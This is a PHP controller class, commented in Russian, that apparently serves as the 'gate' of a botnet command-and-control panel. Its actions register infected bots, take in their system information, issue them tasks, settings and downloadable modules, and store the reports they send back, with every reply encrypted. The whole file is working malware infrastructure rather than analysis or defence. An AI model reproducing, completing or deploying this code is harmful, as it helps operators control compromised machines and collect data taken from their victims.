<?php


class Controller_Gate extends Controller {

    public function __construct()
    {
        parent::__construct();
        $this->model = new Model_Gate();
    }


    /**
     * Обновление информации о выполнении конкретного таска
     */
    public function action_upd_task_status()
    {
        Logger::Trace('Controller_Gate', 'action_upd_task_status', 'Start to update task status');
        $this->model = new Model_Gate();
        if ($this->model->getGateStatus()) {
            $this->model->setRequestData($this->data);
            $updated = $this->model->updateStatusForBot();
            Logger::Trace('Controller_Gate', 'action_upd_task_status', 'End to update task status');
            $this->outCryptedData((string)$updated);
        } else {
            $this->outCryptedData('Gate not active');
        }
    }

    /**
     * Обновление информации о боте или регистрация нового бота
     */
    public function action_bot_upd_sys_info()
    {
        Logger::Trace('Controller_Gate', 'action_bot_upd_sys_info', 'Entered into function');
        if ($this->isGateActive()) {
            $this->model->setRequestData($this->data);
            $this->model->convertDataToUnderstandingView();
            $bot = $this->model->isBotExist();
            if ($bot) {
                Logger::Trace('Controller_Gate', 'action_bot_upd_sys_info', 'Start to update bot info');
                $resp = $this->model->updateBot($bot);
                $this->outCryptedDataByRef($resp);
            } else {
                Logger::Trace('Controller_Gate', 'action_bot_upd_sys_info', 'Start to reg bot');
                $bot = $this->model->regBot();
                if ($bot > 0)
                {
                    Logger::Trace('Controller_Gate', 'action_bot_upd_sys_info', 'Bot registered');
                    $this->outCryptedData('reg|id[' . $bot . ']');
                }
                else
                {
                    Logger::Trace('Controller_Gate', 'action_bot_upd_sys_info', 'Bot did not register', null, json_encode($this->data));
                    $this->outCryptedData('not_reg');
                }
            }
        }
    }

    /**
     * Выдача настроек, модулей и тасков боту
     */
    public function action_bot_knock()
    {
        Logger::Trace('Controller_Gate', 'action_bot_knock', 'Entered into function');
        if ($this->isGateActive()) {
            $this->model->setRequestData($this->data);
            $bot = $this->model->isBotExist();
            if ($bot)
            {
                $resp = $this->model->knockBot();
                Logger::Trace('Model_Gate', 'action_bot_knock', 'Information for the bot received');
                $this->outCryptedData($resp);
            }
            else
            {
                Logger::Trace('Controller_Gate', 'action_bot_knock', 'Bot does not exist');
            }
        }
    }

    /**
     * Получение обновленного модуля по id
     */
    public function action_get_module_context()
    {
        Logger::Trace('Controller_Gate', 'action_get_module_context', 'Entered into function');

        if ($this->isGateActive()) {
            $this->model->setRequestData($this->data);
            $bot = $this->model->isBotExist();
            if ($bot) {
                $resp = $this->model->getModuleContext();

                Logger::Trace('Controller_Gate', 'action_get_module_context', 'Module context received');

                $this->outCryptedData($resp);
            }
            else
            {
                Logger::Trace('Controller_Gate', 'action_get_module_context', 'Bot does not exist');
            }
        }
    }

    /**
     * Обработка и сохранение полученных репортов с бота
     */
    public function action_write_reports()
    {
        if ($this->isGateActive())
        {
            $this->model->setRequestData($this->data);
            if ($this->model->writeReports())
            {
                die('1');
            }
            die('0');
        }
    }

    private function outCryptedData($output)
    {
        die(Crypt::encode($output));
    }

    private function outCryptedDataByRef(&$output)
    {
        die(Crypt::encode($output));
    }

    private function isGateActive()
    {
        if ($this->model->getGateStatus()) {
            return true;
        }
        return false;
    }
}